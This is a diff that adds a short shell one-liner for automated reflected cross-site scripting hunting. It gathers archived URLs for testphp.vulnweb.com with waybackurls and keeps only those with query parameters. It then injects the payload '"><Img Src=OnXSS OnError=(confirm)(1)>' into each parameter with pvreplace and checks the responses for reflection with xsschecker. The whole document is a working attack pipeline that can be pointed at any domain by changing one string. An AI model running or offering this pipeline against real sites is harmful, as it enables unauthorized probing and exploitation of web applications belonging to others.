@@ -1,0 +1,4 @@
+echo "testphp.vulnweb.com" | waybackurls | urldedupe -s | grep -aE '=|%3D' | \
+egrep -aiv '.(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|icon|pdf|svg|txt|js)' | \
+pvreplace -silent -payload 'rix4uni"><Img Src=OnXSS OnError=(confirm)(1)>' -fuzzing-mode single | xsschecker -nc -match 'rix4uni' -vuln
+
